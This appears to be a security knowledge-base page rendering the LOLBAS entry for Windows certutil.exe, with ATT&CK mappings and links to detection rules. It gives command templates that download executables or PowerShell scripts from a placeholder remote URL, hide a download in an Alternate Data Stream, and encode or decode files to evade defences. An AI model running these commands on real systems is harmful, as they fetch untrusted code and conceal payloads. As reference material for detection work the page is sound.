---
title: "Certutil.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Certutil.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Certutil.exe"
functions:
  - "Download"
  - "ADS"
  - "Encode"
  - "Decode"
attack_technique_ids:
  - "T1105"
  - "T1564.004"
  - "T1027.013"
  - "T1140"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Windows binary used for handling certificates

## Paths

- `C:\Windows\System32\certutil.exe`
- `C:\Windows\SysWOW64\certutil.exe`

## Commands

### 1. Download

Download and save an executable to disk in the current folder.

```cmd
certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
```

- Use Case: Download file from Internet
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

### 2. Download

Download and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>` when not.

```cmd
certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
```

- Use Case: Download file from Internet
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

### 3. ADS

Download and save a .ps1 file to an Alternate Data Stream (ADS).

```cmd
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
```

- Use Case: Download file from Internet and save it in an NTFS Alternate Data Stream
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts#^t1564004-ntfs-file-attributes|T1564.004: NTFS File Attributes]]

### 4. Download

Download and save an executable to `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`.

```cmd
certutil.exe -URL {REMOTEURL:.exe}
```

- Use Case: Download file from Internet
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

### 5. Encode

Command to encode a file using Base64

```cmd
certutil -encode {PATH} {PATH:.base64}
```

- Use Case: Encode files to evade defensive measures
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1027-obfuscated_files_or_information#^t1027013-encrypted-encoded-file|T1027.013: Encrypted/Encoded File]]

### 6. Decode

Command to decode a Base64 encoded file.

```cmd
certutil -decode {PATH:.base64} {PATH}
```

- Use Case: Decode files to evade defensive measures
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1140-deobfuscate_decode_files_or_information|T1140: Deobfuscate/Decode Files or Information]]

### 7. Decode

Command to decode a hexadecimal-encoded file.

```cmd
certutil -decodehex {PATH:.hex} {PATH}
```

- Use Case: Decode files to evade defensive measures
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1140-deobfuscate_decode_files_or_information|T1140: Deobfuscate/Decode Files or Information]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_decode.yml
- Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml
- IOC: Certutil.exe creating new files on disk
- IOC: Useragent Microsoft-CryptoAPI/10.0
- IOC: Useragent CertUtil URL Agent

## Resources

- {'Link': 'https://twitter.com/Moriarty_Meng/status/984380793383370752'}
- {'Link': 'https://twitter.com/mattifestation/status/620107926288515072'}
- {'Link': 'https://twitter.com/egre55/status/1087685529016193025'}
- {'Link': 'https://www.hexacorn.com/blog/2020/08/23/certutil-one-more-gui-lolbin/'}

## Acknowledgements

- {'Person': 'Matt Graeber', 'Handle': '@mattifestation'}
- {'Person': 'Moriarty', 'Handle': '@Moriarty_Meng'}
- {'Person': 'egre55', 'Handle': '@egre55'}
- {'Person': 'Lior Adar'}
- {'Person': 'Adam', 'Handle': '@hexacorn'}
- {'Person': 'SomeTestLeper', 'Handle': '@SomeTestLeper'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml)
